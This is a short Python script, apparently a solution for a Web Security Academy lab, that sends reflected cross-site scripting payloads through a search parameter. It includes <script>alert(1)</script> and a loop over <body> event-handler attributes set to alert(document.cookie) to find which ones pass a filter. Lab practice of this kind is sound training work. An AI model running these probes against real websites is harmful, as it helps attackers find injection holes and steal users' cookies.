import requests
import sys
import re
from bs4 import BeautifulSoup


site = 'ac4d1f671f97cf06c069511b00ba001f.web-security-academy.net/'
s = requests.Session()
search_url = f'https://{site}/?search=<script>alert(1)</script>'
resp = s.get(search_url)


search_term = '''<script>alert(1)</script>'''
search_url = f'https://{site}/?search={search_term}'
resp = s.get(search_url)
if resp.status_code == 200:
    print(f'Success: {search_url} gives {resp.status_code}')
else:
    print(f'Error: {search_url} gives {resp.status_code}: {resp.text}')


odin_id = 'madler'
search_term = f'''<body>{odin_id}</body>'''
search_url = f'https://{site}/?search={search_term}'

attributes = ['onload','onunload','onerror','onmessage','onpagehide','onpageshow','onresize','onstorage']
for attribute in attributes:
    search_term = f'''<body {attribute}=alert(document.cookie)></body>'''
    search_url = f'https://{site}/?search={search_term}'
    resp = s.get(search_url)
    if resp.status_code == 200:
        print(f'Success: {search_term} gives code {resp.status_code}')
    else:
        print(f'Error: {search_term} gives response: {resp.text}')